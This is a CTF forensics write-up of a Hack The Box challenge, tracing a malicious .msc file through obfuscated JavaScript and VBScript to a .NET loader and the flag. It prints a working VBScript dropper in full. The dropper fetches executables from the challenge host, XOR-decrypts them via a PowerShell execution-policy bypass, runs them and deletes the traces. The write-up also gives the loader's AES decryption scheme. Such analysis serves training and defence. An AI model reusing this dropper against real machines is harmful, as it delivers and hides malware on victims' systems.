---
layout: post
title: Binary Badresources Writeup
date: 2024-12-16 16:35 +1100
categories: [CTF-Writeup, Binary-Badlands]
tags: [forensics, ctf, htb-ctf]
---
This is a medium forensics challenge from the HTB University CTF 2024.

The challenge starts with us getting a `.msc` file, a type of file which may be used to configure aspects of Windows. The file is just XML, so we can examine it. After digging through the file we find what appears to be obfuscated javascript:

```javascript
          var _0x4ad86c=_0x53e0;(function(_0x4f7c4e,_0xd4182a){var _0x5504c4=_0x53e0,_0x1e159e=_0x4f7c4e();while(!![]){try{var 

<---- SNIP ---->
          _86c(0x235)+_0x4ad86c(0x1d0)+_0x4ad86c(0x158)+'3E'))),XML[_0x4ad86c(0x204)+_0x4ad86c(0x29d)](xsl);

```

We can paste the deobfuscated javascript into https://obf-io.deobfuscate.io/, which will give us:

```javascript
var scopeNamespace = external.Document.ScopeNamespace;
var rootNode = scopeNamespace.GetRoot();
var mainNode = scopeNamespace.GetChild(rootNode);
var docNode = scopeNamespace.GetNext(mainNode);
external.Document.ActiveView.ActiveScopeNode = docNode;
docObject = external.Document.ActiveView.ControlObject;
external.Document.ActiveView.ActiveScopeNode = mainNode;
docObject.async = false;
docObject.loadXML(unescape("%3C%3Fxml%20version%3D%271%2E0%27%3F%3E%0D%0A%3Cstylesheet%0D%0A%20%20%20%20xmlns%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas%2Dmicrosoft%2Dcom%3Axslt%22%0D%0A%20%20%20%20xmlns%3Auser%3D%22placeholder%22%0D%0A%20%20%20%20version%3D%221%2E0%22%3E%0D%0A%20%20%20%20%3Coutput%20method%3D%22text%22%2F%3E%0D%0A%20%20%20%20%3Cms%3Asc
<---- SNIP ---->
vieq%24A%24Rsxlmrk%0EIrh%24Wyf%0E%22%2Ci%2C1%29%29%20%2D%20%285%29%20%2B%20%281%29%29%3ANext%3AExecute%20TpHCM%3A%0D%0A%20%20%20%20%5D%5D%3E%0D%0A%20%20%20%20%3C%2Fms%3Ascript%3E%0D%0A%3C%2Fstylesheet%3E"));
docObject.transformNode(docObject);
```

Let us take a look at what this XML is, which can be done by `console.log` ing the unescaped XML data:

```xml
<?xml version='1.0'?>
<stylesheet
    xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="placeholder"
    version="1.0">
    <output method="text"/>
    <ms:script implements-prefix="user" language="VBScript">
    <![CDATA[
TpHCM = "":for i = 1 to 3222: TpHCM = TpHCM + chr(Asc(mid("Stxmsr$I|tpmgmxHmq$sfnWlipp0$sfnJWS0$sfnLXXTHmq$wxvYVP50$wxvYVP60$wxvYVP70$wxvWls{jmpiYVPHmq$wxvHs{rpsehTexl50$wxvHs{rpsehTexl60$wxvHs{rpsehTexl70$wx
<---- SNIP ---->
$Wix$sfnWxvieq$A$GviexiSfnigx,&EHSHF2Wxvieq&-$$$$sfnLXXT2Stir$&KIX&0$yvp0$Jepwi$$$$sfnLXXT2Wirh$$$$Mj$sfnLXXT2Wxexyw$A$644$Xlir$$$$$$$$sfnWxvieq2Stir$$$$$$$$sfnWxvieq2X}ti$A$5$$$$$$$$sfnWxvieq2[vmxi$sfnLXXT2ViwtsrwiFsh}$$$$$$$$sfnWxvieq2WeziXsJmpi$texl0$6$$$$$$$$sfnWxvieq2Gpswi$$$$Irh$Mj$$$$Wix$sfnWxvieq$A$RsxlmrkIrh$Wyf",i,1)) - (5) + (1)):Next:Execute TpHCM:
    ]]>
    </ms:script>
</stylesheet>
```

In this XML file, it is clear that it is trying to execute some VBScript, indicated by the `language="VBScript"`. Looking closer at the VBScript (in the CDATA section), we see it is looping over a string to perform some operations, appending it to a string, end calling `Execute` on the string. The `Execute` function will try to run the string `TpHCM` as more VBScript. Lets translate the loop to python to see what `TpHCM` is.

Translating:
- The `mid(<string>, i, 1)` function does the same as `<string>[i - 1]` in python, 
-  `Asc()` is equivalent to `ord()` in python

As a result we get:
```python
with open("obfuscatedVB.txt", "rb") as f:
    obf = f.read()
    for i in range(len(obf)):
        print(chr(obf[i] - 5 + 1), end="")

```

And the output VBScript is:
```vb
Option ExplicitDim objShell, objFSO, objHTTPDim strURL1, strURL2, strURL3, strShowfileURLDim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePathDim strExecutablePath, strPowerShellScriptstrURL1 = "http://windowsupdate.htb/csrss.exe"strURL2 = "http://windowsupdate.htb/csrss.dll"strURL3 = "http://windowsupdate.htb/csrss.exe.config"strShowfileURL = "http://windowsupdate.htb/wanted.pdf"strDownloadPath1 = "C:\Users\Public\csrss.exe"strDownloadPath2 = "C:\Users\Public\csrss.dll"strDownloadPath3 = "C:\Users\Public\csrss.exe.config"strShowfilePath = "C:\Users\Public\wanted.pdf"strExecutablePath = "C:\Users\Public\csrss.exe"Set objShell = CreateObject("WScript.Shell")Set objFSO = CreateObject("Scripting.FileSystemObject")Set objHTTP = CreateObject("MSXML2.XMLHTTP")If Not objFSO.FileExists(strDownloadPath1) Then    DownloadFile strURL1, strDownloadPath1End IfIf Not objFSO.FileExists(strDownloadPath2) Then    DownloadFile strURL2, strDownloadPath2End IfIf Not objFSO.FileExists(strDownloadPath3) Then    DownloadFile strURL3, strDownloadPath3End IfIf Not objFSO.FileExists(strShowfilePath) Then    DownloadFile strShowfileURL, strShowfilePathEnd IfstrPowerShellScript = _"param (" & vbCrLf & _"    [string]$FilePath," & vbCrLf & _"    [string]$KeyPath" & vbCrLf & _")" & vbCrLf & _"$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _"$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _"$keyLength = $key.Length" & vbCrLf & _"for ($i = 0; $i -lt $fileContent.Length; $i++) " & vbCrLf & _"    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _"¿~" & vbCrLf & _"[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLfDim objFileOn Error Resume NextSet objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)If Err.Number <> 0 Then    WScript.Echo "Error creating PowerShell script file: " & Err.Description    WScript.QuitEnd IfobjFile.WriteLine strPowerShellScriptobjFile.CloseDim arrFilePathsarrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)Dim iFor i = 0 To UBound(arrFilePaths)    Dim intReturnCode    intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)        If intReturnCode <> 0 Then        WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode    End IfNextobjShell.Run strExecutablePath, 1, TrueobjShell.Run strShowfilePath, 1, TrueobjFSO.DeleteFile "C:\Users\Public\csrss.dll"objFSO.DeleteFile "C:\Users\Public\csrss.exe"objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"objFSO.DeleteFile "C:\Users\Public\temp.ps1"Sub DownloadFile(url, path)    Dim objStream    Set objStream = CreateObject("ADODB.Stream")    objHTTP.Open "GET", url, False    objHTTP.Send    If objHTTP.Status = 200 Then        objStream.Open        objStream.Type = 1        objStream.Write objHTTP.ResponseBody        objStream.SaveToFile path, 2        objStream.Close    End If    Set objStream = NothingEnd Sub
```

There is a lot going on here, so lets step through it.
```vb
Option Explicit
Dim objShell, objFSO, objHTTPDim strURL1, strURL2, strURL3, strShowfileURL
Dim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePathDim strExecutablePath, strPowerShellScript
strURL1 = "http://windowsupdate.htb/csrss.exe"
strURL2 = "http://windowsupdate.htb/csrss.dll"
strURL3 = "http://windowsupdate.htb/csrss.exe.config"
strShowfileURL = "http://windowsupdate.htb/wanted.pdf"
strDownloadPath1 = "C:\Users\Public\csrss.exe"
strDownloadPath2 = "C:\Users\Public\csrss.dll"
strDownloadPath3 = "C:\Users\Public\csrss.exe.config"
strShowfilePath = "C:\Users\Public\wanted.pdf"
strExecutablePath = "C:\Users\Public\csrss.exe"
```
Here we save some strings as variables. We can download these URL's to check out later.

```vb
If Not objFSO.FileExists(strDownloadPath1) Then    
	DownloadFile strURL1, strDownloadPath1
End If
```
Here we see the script checks if a file exists before downloading the corresponding file, and a similar pattern is repeated for all of the URL's from earlier.

```vb
strPowerShellScript = _"param (" & vbCrLf & _"    [string]$FilePath," & vbCrLf & _"    [string]$KeyPath" & vbCrLf & _")" & vbCrLf & _"$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _"$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _"$keyLength = $key.Length" & vbCrLf & _"for ($i = 0; $i -lt $fileContent.Length; $i++) " & vbCrLf & _"    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _"¿~" & vbCrLf & _"[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLf
```
Here the program defines a powershell script. Lets clean this up by removing all the `vbCrLf` constants, replacing them with newlines:

```powershell
param ( 
     [string]$FilePath, 
     [string]$KeyPath 
 ) 
 $key = [System.IO.File]::ReadAllBytes($KeyPath) 
 $fileContent = [System.IO.File]::ReadAllBytes($FilePath) 
 $keyLength = $key.Length 
 for ($i = 0; $i -lt $fileContent.Length; $i++)  
     $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength] 
 ¿~ 
 [System.IO.File]::WriteAllBytes($FilePath, $fileContent)

```
We can see this seems to be a script that decrypts a file by xoring it with a key file.

```vb
Dim objFile
On Error Resume Next
Set objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)
If Err.Number <> 0 Then    
	WScript.Echo "Error creating PowerShell script file: " & Err.Description    
	WScript.Quit
End If
objFile.WriteLine strPowerShellScript
objFile.Close
```
Next the file writes the powershell script to `temp.ps1`.

```vb
Dim arrFilePaths
arrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)
Dim i
For i = 0 To UBound(arrFilePaths)
	Dim intReturnCode    
	intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)
	If intReturnCode <> 0 Then        
		WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode    
	End If
Next
```
Here the program seems to be running the script from above, with the encrypted files as the 1st, 3rd and 4th files downloaded, and the key as the second.
We can mimic this later to decrypt our files ourself.

```vb
objShell.Run strExecutablePath, 1, True
objShell.Run strShowfilePath, 1, True
objFSO.DeleteFile "C:\Users\Public\csrss.dll"
objFSO.DeleteFile "C:\Users\Public\csrss.exe"
objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"
objFSO.DeleteFile "C:\Users\Public\temp.ps1"
Sub DownloadFile(url, path)    
	Dim objStream    
	Set objStream = CreateObject("ADODB.Stream")    
	objHTTP.Open "GET", url, False    
	objHTTP.Send    
	If objHTTP.Status = 200 Then        
		objStream.Open        
		objStream.Type = 1        
		objStream.Write objHTTP.ResponseBody        
		objStream.SaveToFile path, 2        
		objStream.Close    
	End If    
	Set objStream = Nothing
End Sub
```
At the end, the program runs the executable file created, which was `csrss.exe`, as well as the created pdf file, deletes all the files, and defines the `DownloadFile` function from earlier.

Lets try to download these files and decrypt them ourself.
After downloading the files, we can make a python script to decode the files:
```python
import sys

keyFile = "csrss.dll"
encFile = sys.argv[1]

keyFileContents = open(keyFile, "rb").read()
encFileContents = open(encFile, "rb").read()


for i in range(len(encFileContents)):
    print(chr(encFileContents[i] ^ keyFileContents[i % len(keyFileContents)]), end="")

```
Then we can run the command for example `python3 decode.py csrss.exe.enc > csrss.exe` to decode a file.

Lets do this for `csrss.exe`, `csrss.exe.config` and `wanted.pdf`.
`csrss.exe` is a MS-DOS executable, and we can assume `csrss.exe.config` is its config file.
`wanted.pdf` does not give anything  of value.
Looking closer at the config file, we see the line:
```XML
            <codeBase version="0.0.0.0" href="http://windowsupdate.htb/5f8f9e33bb5e13848af2622b66b2308c.json"/>

```
We can download this file as well.
![Downloaded file](/assets/img/writeup/20241216161108.png)

We see this file is actually a `.NET` assembly DLL. Let's use `ILSpy` to see what it is doing.

Looking around the decompiled binary, we see an interesting function being called in one of the methods:
![Interesting function](/assets/img/writeup/20241216161549.png)

If we can see what Uri's get passed into this function, we may be able to find some more information.

Looking around, we see this method being called on the line
```c#
byte[] array = indigowilddrain95354(new Uri(magentaboorishgirl01630.indigoinnocentbeast26519("ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=")));
```
In the same function the array gets executed.

However, it seems that this Uri is first transformed by `magentaboorishgirl01630.indigoinnocentbeast26519`. Lets see what this method is.

*This is what some variables that may come in handy later are set as in the class*
```c#
static magentaboorishgirl01630()
{
	creamhollowticket40621 = "tbbliftalildywic";
	fuchsiaaromaticmarket70603 = Encoding.UTF8.GetBytes(creamhollowticket40621);
	mintpumpedowl79724 = "vudzvuokmioomyialpkyydvgqdmdkdxy";
	steelshiveringpark49573 = charcoalderangedcarriage58994(mintpumpedowl79724);
	cipherMode = CipherMode.CBC;
	paddingMode = PaddingMode.Zeros;
}
```

```c#
public static string indigoinnocentbeast26519(string claretpurpleneck44589)
{
	return charcoalsleepyadvertisement91853(Convert.FromBase64String(claretpurpleneck44589)).Replace("\0", string.Empty);
}
```
It seems the method first base64 decodes the string before parsing into another function. Lets check this out too.

```c#
private static string charcoalsleepyadvertisement91853(byte[] creamgrievingcover13021)
{
	using AesManaged aesManaged = new AesManaged();
	aesManaged.Mode = cipherMode;
	aesManaged.Padding = paddingMode;
	aesManaged.Key = steelshiveringpark49573;
	aesManaged.IV = fuchsiaaromaticmarket70603;
	ICryptoTransform transform = aesManaged.CreateDecryptor(aesManaged.Key, aesManaged.IV);
	using MemoryStream stream = new MemoryStream(creamgrievingcover13021);
	using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read);
	byte[] array = new byte[creamgrievingcover13021.Length];
	int count = cryptoStream.Read(array, 0, array.Length);
	return Encoding.UTF8.GetString(array, 0, count);
}
```
In this function, it is immediately clear that the function is going to try to decrypt the base64 decoded string using AES. We see that the `Key` is `steelshiveringpark49573`, which we saw earlier was defined as:
```c#
mintpumpedowl79724 = "vudzvuokmioomyialpkyydvgqdmdkdxy";
steelshiveringpark49573 = charcoalderangedcarriage58994(mintpumpedowl79724);
```

Looking at the function called here, we see it is simply making a `SHA256` hash of the key.
```
private static byte[] charcoalderangedcarriage58994(string orangewealthyjump31951)
{
	using SHA256 sHA = SHA256.Create();
	return sHA.ComputeHash(Encoding.UTF8.GetBytes(orangewealthyjump31951));
}
```

So we know now that to get the url:
- We first decode the string `ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=` from base64
- We make a sha256 hash of `vudzvuokmioomyialpkyydvgqdmdkdxy` to get the AES key
- We decrypt the string in AES CBC mode with the IV `tbbliftalildywic`.
Let us mimic this in cyberchef.
We will first get the sha256 hash of `vudzvuokmioomyialpkyydvgqdmdkdxy`, which turns out to be
`5e7ae122602aa56d3340fbada0f62f78f246d549f340dc9df23a033f2dd29c5a`

The cyberchef recipe:
![Cyberchef AES](/assets/img/writeup/20241216163104.png)

The output:
`http://windowsupdate.htb/ec285935b46229d40b95438707a7efb2282f2f02.xml           `

Let us download this file too and examine it.
Running strings against the binary we see:
![Strings output](/assets/img/writeup/20241216163242.png)
Where we find the flag!
`HTB{mSc_1s_b31n9_s3r10u5ly_4buSed}`
